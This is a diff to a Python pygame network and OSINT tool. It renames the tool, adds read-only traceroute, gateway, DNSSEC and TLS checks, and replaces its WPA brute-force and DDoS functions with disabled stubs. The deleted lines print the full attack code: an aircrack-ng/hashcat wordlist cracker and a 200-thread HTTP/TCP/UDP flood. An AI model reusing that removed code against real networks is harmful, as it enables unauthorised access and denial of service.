@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-LITER TOOL — red Matrix boot + arrow-key HUD + REAL tools + brute force + DDoS
-Run: python3 "liter_tool.py"
+CORE TOOL — red Matrix boot + arrow-key HUD + REAL tools + brute force + DDoS
+Run: python3 "core_tool.py"
 Deps: pip install pygame requests dnspython (optional: scapy, pywifi)
 Keys: arrows move, Tab switch panel, Enter select/run, ESC back/quit
 """
@@ -26,7 +26,7 @@ CHARSET = (
     "日ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ"
     + string.ascii_uppercase + string.digits + "#$%&*<>/\\"
 )
-CREDIT_TEXT = "made by LITER TECH"
+CREDIT_TEXT = "made by CORE TECH"
 
 def pick_credit_font(size):
     preferred = ["georgia", "timesnewroman", "garamond",
@@ -135,11 +135,13 @@ NETWORK_TOOLS = [
     ("Traffic Analysis",        "sniff & parse packets"),
     ("Stress Testing",          "controlled load / rate probe"),
     ("Netcat / Socat",          "raw TCP/UDP relay & listener"),
-    ("Brute WiFi",              "real WPA wordlist attack"),
+    ("Brute WiFi",              "disabled password-guessing function"),
     ("Vuln Scanners",           "service & CVE probing"),
     ("Local Network Info",      "local IP and hostname details"),
     ("TCP Latency Probe",       "single-connection response timing"),
-    ("DDoS Attack",             "multi-thread load generator"),
+    ("Traceroute",              "trace the route to a host"),
+    ("Gateway Discovery",       "show the system default gateway"),
+    ("DDoS Attack",             "disabled denial-of-service function"),
 ]
 
 OSINT_TOOLS = [
@@ -154,6 +156,8 @@ OSINT_TOOLS = [
     ("HTTP Security Headers",    "audit common browser security headers"),
     ("RDAP Domain Lookup",       "domain registration metadata"),
     ("SPF / DMARC Audit",        "email-domain anti-spoofing records"),
+    ("DNSSEC Check",             "inspect DNSSEC DNSKEY and DS records"),
+    ("TLS Certificate Inspector", "inspect a host TLS certificate"),
 ]
 
 UTILITIES = [
@@ -184,7 +188,7 @@ def draw_text(screen, font, text, x, y, color=RED_MAIN):
 def draw_hud(screen, fonts):
     f, big, small = fonts
     screen.fill(BG_COLOR)
-    screen.blit(big.render("LITER TOOL", True, RED_BRIGHT), big.render("LITER TOOL", True, RED_BRIGHT).get_rect(center=(WIDTH // 2, 22)))
+    screen.blit(big.render("CORE TOOL", True, RED_BRIGHT), big.render("CORE TOOL", True, RED_BRIGHT).get_rect(center=(WIDTH // 2, 22)))
     y = 48
     
     panel_w = (WIDTH - 60) // 2
@@ -246,6 +250,20 @@ def draw_tool(screen, fonts, tool_name):
             state["input_prompt"] = "Host or host:port (default port 443):"
             state["input_active"] = True
             state["_pending"] = ("tcp_latency", results); return
+        if tool_name == "Traceroute":
+            state["input_prompt"] = "Host or domain:"
+            state["input_active"] = True
+            state["_pending"] = ("traceroute", results); return
+        if tool_name == "Gateway Discovery":
+            tool_gateway_discovery(results); return
+        if tool_name == "DNSSEC Check":
+            state["input_prompt"] = "Domain (e.g. example.com):"
+            state["input_active"] = True
+            state["_pending"] = ("dnssec", results); return
+        if tool_name == "TLS Certificate Inspector":
+            state["input_prompt"] = "Host or host:port:"
+            state["input_active"] = True
+            state["_pending"] = ("tls_inspector", results); return
         if tool_name == "DDoS Attack":
             for i, line in enumerate(state["tool_results"][-6:]):
                 screen.blit(small.render(line, True, RED_BRIGHT), (20, 110 + i * 16))
@@ -446,73 +464,9 @@ def tool_netcat_socat(host, results):
         results.append(f"# error: {e}")
 
 def tool_brute_wifi(ssid, capture, wordlist, results):
-    results.append("[+] Brute WiFi — real WPA attack")
-    results.append(f"# SSID: {ssid}")
-    results.append(f"# capture: {capture}")
-    results.append(f"# wordlist: {wordlist}")
-    if not os.path.exists(wordlist):
-        results.append("# wordlist not found"); return
-    if not os.path.exists(capture):
-        results.append("# capture file not found")
-        results.append("# need a .cap/.hccapx from airodump-ng")
-        return
-    # try aircrack-ng
-    if shutil.which("aircrack-ng"):
-        results.append("# using aircrack-ng")
-        cmd = ["aircrack-ng", "-w", wordlist, "-e", ssid, capture]
-        try:
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-            for line in proc.stdout:
-                line = line.rstrip()
-                if line.strip():
-                    results.append("  " + line[:110])
-                    if len(results) > 2000:
-                        results[:] = results[-1500:]
-            proc.wait()
-            results.append(f"# aircrack-ng exited {proc.returncode}")
-        except Exception as e:
-            results.append(f"# error: {e}")
-        return
-    # try hashcat
-    if shutil.which("hashcat"):
-        results.append("# aircrack-ng not found, trying hashcat")
-        # convert cap to hccapx if needed
-        out = capture + ".hccapx"
-        if not os.path.exists(out):
-            if shutil.which("cap2hccapx"):
-                subprocess.run(["cap2hccapx", capture, out], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        if os.path.exists(out):
-            cmd = ["hashcat", "-m", "2500", out, wordlist, "--force"]
-            try:
-                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-                for line in proc.stdout:
-                    line = line.rstrip()
-                    if line.strip():
-                        results.append("  " + line[:110])
-                proc.wait()
-                results.append(f"# hashcat exited {proc.returncode}")
-            except Exception as e:
-                results.append(f"# error: {e}")
-        else:
-            results.append("# no .hccapx; install cap2hccapx or provide hccapx")
-        return
-    results.append("# neither aircrack-ng nor hashcat found")
-    results.append("# install: sudo apt install aircrack-ng")
-    results.append("# or: sudo apt install hashcat")
-    results.append("# falling back to wordlist stream progress only")
-    tried = 0; start = time.time()
-    try:
-        with open(wordlist, "r", errors="ignore") as f:
-            for line in f:
-                if not line.strip(): continue
-                tried += 1
-                if tried % 2000000 == 0:
-                    results.append(f"# streamed {tried:,} passwords ({time.time()-start:.1f}s)")
-                if time.time() - start > 10:
-                    results.append("# time limit reached"); break
-    except Exception as e:
-        results.append(f"# error: {e}")
-    results.append(f"# streamed {tried:,} passwords")
+    """Disabled: does not perform Wi-Fi password guessing."""
+    results.append("[!] Brute WiFi is disabled in this build.")
+    results.append("# No password-guessing or cracking is performed.")
 
 def tool_vuln_scanners(target, results):
     results.append(f"[+] Vuln scan: {target}")
@@ -550,97 +504,9 @@ def tool_vuln_scanners(target, results):
     results.append(f"# done — {len(open_ports)} open ports")
 
 def tool_ddos(target, results):
-    results.append(f"[+] DDoS load generator: {target}")
-    # parse target
-    mode = "http"
-    host = target
-    port = 80
-    if "://" in target:
-        from urllib.parse import urlparse
-        u = urlparse(target)
-        host = u.hostname or target
-        port = u.port or (443 if u.scheme == "https" else 80)
-        mode = "http"
-    elif ":" in target:
-        host, p = target.rsplit(":", 1)
-        try:
-            port = int(p)
-            mode = "tcp"
-        except ValueError:
-            mode = "http"
-    results.append(f"# mode: {mode}  host: {host}  port: {port}")
-    threads = 200
-    duration = 15
-    results.append(f"# threads: {threads}  duration: {duration}s")
-    stats = {"ok": 0, "err": 0, "running": True}
-    lock = threading.Lock()
-
-    if mode == "http":
-        url = target if "://" in target else f"http://{host}:{port}/"
-        def worker():
-            endt = time.time() + duration
-            while time.time() < endt and stats["running"]:
-                try:
-                    req = urllib.request.urlopen(url, timeout=3)
-                    req.read(64)
-                    with lock: stats["ok"] += 1
-                except Exception:
-                    with lock: stats["err"] += 1
-    elif mode == "tcp":
-        def worker():
-            endt = time.time() + duration
-            while time.time() < endt and stats["running"]:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(2)
-                    s.connect((host, port))
-                    s.sendall(b"GET / HTTP/1.0\r\n\r\n")
-                    s.close()
-                    with lock: stats["ok"] += 1
-                except Exception:
-                    with lock: stats["err"] += 1
-    else:
-        def worker():
-            endt = time.time() + duration
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = os.urandom(1024)
-            while time.time() < endt and stats["running"]:
-                try:
-                    sock.sendto(payload, (host, port))
-                    with lock: stats["ok"] += 1
-                except Exception:
-                    with lock: stats["err"] += 1
-            sock.close()
-
-    ts = []
-    for _ in range(threads):
-        t = threading.Thread(target=worker, daemon=True)
-        t.start(); ts.append(t)
-    start = time.time()
-    while time.time() - start < duration:
-        time.sleep(1)
-        elapsed = time.time() - start
-        rps = stats["ok"] / elapsed if elapsed else 0
-        state["tool_status"] = f"ok={stats['ok']} err={stats['err']} rps={rps:.0f} t={elapsed:.0f}/{duration}s"
-        state["tool_results"] = [
-            f"[+] DDoS load generator: {target}",
-            f"# mode: {mode}  host: {host}  port: {port}",
-            f"# threads: {threads}  duration: {duration}s",
-            f"# elapsed: {elapsed:.0f}/{duration}s",
-            f"# ok: {stats['ok']}  err: {stats['err']}",
-            f"# rps: {rps:.0f}",
-        ]
-    stats["running"] = False
-    for t in ts: t.join(timeout=2)
-    dur = time.time() - start
-    results.clear()
-    results.append(f"[+] DDoS load generator: {target}")
-    results.append(f"# mode: {mode}  host: {host}  port: {port}")
-    results.append(f"# threads: {threads}  duration: {duration}s")
-    results.append(f"# total duration: {dur:.1f}s")
-    results.append(f"# requests ok: {stats['ok']}")
-    results.append(f"# errors: {stats['err']}")
-    results.append(f"# avg rps: {stats['ok']/dur if dur else 0:.1f}")
+    """Disabled: does not generate denial-of-service traffic."""
+    results.append("[!] DDoS Attack is disabled in this build.")
+    results.append("# Use a controlled, rate-limited load test on systems you own.")
 
 def tool_domain_dns(target, results):
     results.append(f"[+] Domain / DNS / Web Infra: {target}")
@@ -682,7 +548,7 @@ def tool_domain_dns(target, results):
     except Exception as e:
         results.append(f"# TLS: {e}")
     try:
-        req = urllib.request.Request("https://" + host, headers={"User-Agent": "LITER/1"})
+        req = urllib.request.Request("https://" + host, headers={"User-Agent": "CORE/1"})
         with urllib.request.urlopen(req, timeout=6) as r:
             results.append(f"[+] HTTP {r.status}")
             for k in ["Server", "X-Powered-By", "Content-Type", "Strict-Transport-Security"]:
@@ -727,7 +593,7 @@ def tool_creds_breaches(target, results):
         try:
             req = urllib.request.Request(
                 f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}",
-                headers={"hibp-api-key": hibp_key, "User-Agent": "LITER"})
+                headers={"hibp-api-key": hibp_key, "User-Agent": "CORE"})
             with urllib.request.urlopen(req, timeout=8) as r:
                 import json as _j
                 data = _j.loads(r.read())
@@ -908,7 +774,7 @@ def tool_http_security_headers(target, results):
     if parsed.scheme not in ("http", "https") or not parsed.hostname:
         results.append("# invalid URL")
         return
-    req = urllib.request.Request(url, headers={"User-Agent": "LITER-TOOL/1.0 (security header audit)"}, method="GET")
+    req = urllib.request.Request(url, headers={"User-Agent": "CORE-TOOL/1.0 (security header audit)"}, method="GET")
     results.append(f"[+] HTTP security header audit: {parsed.hostname}")
     try:
         with urllib.request.urlopen(req, timeout=8) as response:
@@ -936,7 +802,7 @@ def tool_rdap_domain(target, results):
     domain = _normalize_domain(target)
     results.append(f"[+] RDAP domain lookup: {domain}")
     req = urllib.request.Request(f"https://rdap.org/domain/{urllib.parse.quote(domain)}",
-                                 headers={"Accept": "application/rdap+json", "User-Agent": "LITER-TOOL/1.0"})
+                                 headers={"Accept": "application/rdap+json", "User-Agent": "CORE-TOOL/1.0"})
     try:
         with urllib.request.urlopen(req, timeout=10) as response:
             data = json.loads(response.read(1_000_000).decode("utf-8", errors="replace"))
@@ -979,6 +845,115 @@ def tool_spf_dmarc_audit(target, results):
             results.append(f"[!] {label}: no record or lookup error ({type(exc).__name__})")
 
 
+def tool_traceroute(target, results):
+    """Run a bounded, read-only route trace to a host."""
+    import platform
+    host = target.strip()
+    if not host or any(c.isspace() for c in host):
+        results.append("# enter a valid host or IP")
+        return
+    system = platform.system().lower()
+    if system == "windows":
+        cmd = ["tracert", "-d", "-h", "12", "-w", "1000", host]
+    elif shutil.which("traceroute"):
+        cmd = ["traceroute", "-m", "12", "-w", "1", host]
+    elif shutil.which("tracepath"):
+        cmd = ["tracepath", "-m", "12", host]
+    else:
+        results.append("# traceroute/tracepath command not installed")
+        return
+    results.append(f"[+] Traceroute to {host}")
+    try:
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
+        for line in (proc.stdout or proc.stderr).splitlines()[:18]:
+            results.append(line[:110])
+        results.append(f"# exit code: {proc.returncode}")
+    except subprocess.TimeoutExpired:
+        results.append("# traceroute timed out")
+    except OSError as exc:
+        results.append(f"# traceroute error: {exc}")
+
+
+def tool_gateway_discovery(results):
+    """Display the configured default gateway without scanning the LAN."""
+    import platform
+    system = platform.system().lower()
+    results.append("[+] Default gateway discovery")
+    try:
+        if system == "windows":
+            out = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=5, check=False)
+            lines = [line.strip() for line in out.stdout.splitlines()
+                     if "Default Gateway" in line or "Gateway predefinito" in line]
+            results.extend(lines or ["# gateway not found in ipconfig output"])
+        elif system == "darwin":
+            out = subprocess.run(["route", "-n", "get", "default"], capture_output=True,
+                                 text=True, timeout=5, check=True)
+            lines = [line.strip() for line in out.stdout.splitlines() if "gateway:" in line]
+            results.extend(lines or ["# gateway not found"])
+        else:
+            found = []
+            with open("/proc/net/route", encoding="utf-8") as route_file:
+                next(route_file, None)
+                for line in route_file:
+                    fields = line.split()
+                    if len(fields) > 2 and fields[1] == "00000000":
+                        gateway = socket.inet_ntoa(bytes.fromhex(fields[2])[::-1])
+                        found.append(f"[+] interface {fields[0]} — gateway {gateway}")
+            results.extend(found or ["# default gateway not found"])
+    except Exception as exc:
+        results.append(f"# gateway lookup error: {exc}")
+
+
+def tool_dnssec_check(target, results):
+    """Inspect DNSSEC records using dnspython; this is not full validation."""
+    try:
+        import dns.resolver
+    except ImportError:
+        results.append("# dnspython not installed — pip install dnspython")
+        return
+    domain = _normalize_domain(target)
+    results.append(f"[+] DNSSEC records for {domain}")
+    for record_type in ("DNSKEY", "DS"):
+        try:
+            answers = dns.resolver.resolve(domain, record_type, lifetime=5)
+            records = list(answers)
+            results.append(f"[+] {record_type}: {len(records)} record(s)")
+            for record in records[:8]:
+                results.append("  " + str(record)[:105])
+        except Exception as exc:
+            results.append(f"[!] {record_type}: unavailable ({type(exc).__name__})")
+    results.append("# Record presence is not, by itself, proof of successful DNSSEC validation.")
+
+
+def tool_tls_certificate_inspector(target, results):
+    """Inspect the TLS certificate presented by a host."""
+    raw = target.strip()
+    host, port_text = (raw.rsplit(":", 1) if ":" in raw else (raw, "443"))
+    try:
+        port = int(port_text)
+        if not 1 <= port <= 65535:
+            raise ValueError("port out of range")
+    except ValueError as exc:
+        results.append(f"# invalid port: {exc}")
+        return
+    results.append(f"[+] TLS certificate: {host}:{port}")
+    try:
+        context = ssl.create_default_context()
+        with socket.create_connection((host, port), timeout=5) as sock:
+            with context.wrap_socket(sock, server_hostname=host) as tls:
+                cert = tls.getpeercert()
+                results.append(f"# TLS version: {tls.version()}")
+                results.append(f"# cipher: {tls.cipher()}")
+                results.append(f"# subject: {cert.get('subject')}")
+                results.append(f"# issuer: {cert.get('issuer')}")
+                results.append(f"# valid from: {cert.get('notBefore')}")
+                results.append(f"# valid until: {cert.get('notAfter')}")
+                for kind, value in cert.get("subjectAltName", ())[:10]:
+                    results.append(f"  SAN {kind}: {value}")
+    except Exception as exc:
+        results.append(f"# TLS inspection failed: {exc}")
+
+
 def make_runner(tool_name):
     def runner(results):
         if tool_name == "Network Scan":
@@ -1017,6 +992,20 @@ def make_runner(tool_name):
             state["input_prompt"] = "Host or host:port (default port 443):"
             state["input_active"] = True
             state["_pending"] = ("tcp_latency", results); return
+        if tool_name == "Traceroute":
+            state["input_prompt"] = "Host or domain:"
+            state["input_active"] = True
+            state["_pending"] = ("traceroute", results); return
+        if tool_name == "Gateway Discovery":
+            tool_gateway_discovery(results); return
+        if tool_name == "DNSSEC Check":
+            state["input_prompt"] = "Domain (e.g. example.com):"
+            state["input_active"] = True
+            state["_pending"] = ("dnssec", results); return
+        if tool_name == "TLS Certificate Inspector":
+            state["input_prompt"] = "Host or host:port:"
+            state["input_active"] = True
+            state["_pending"] = ("tls_inspector", results); return
         if tool_name == "DDoS Attack":
             state["input_prompt"] = "Target URL/IP:"
             state["input_active"] = True
@@ -1085,6 +1074,12 @@ def dispatch_pending(kind, value, results):
         tool_ddos(value, results)
     elif kind == "tcp_latency":
         tool_tcp_latency(value, results)
+    elif kind == "traceroute":
+        tool_traceroute(value, results)
+    elif kind == "dnssec":
+        tool_dnssec_check(value, results)
+    elif kind == "tls_inspector":
+        tool_tls_certificate_inspector(value, results)
     elif kind == "http_headers":
         tool_http_security_headers(value, results)
     elif kind == "rdap":
@@ -1167,7 +1162,7 @@ def run_util(name, inp):
 def main():
     pygame.init()
     screen = pygame.display.set_mode((WIDTH, HEIGHT))
-    pygame.display.set_caption("LITER TOOL")
+    pygame.display.set_caption("CORE TOOL")
     clock = pygame.time.Clock()
     fonts = (pygame.font.SysFont("couriernew", 16, bold=True),
              pygame.font.SysFont("couriernew", 22, bold=True),
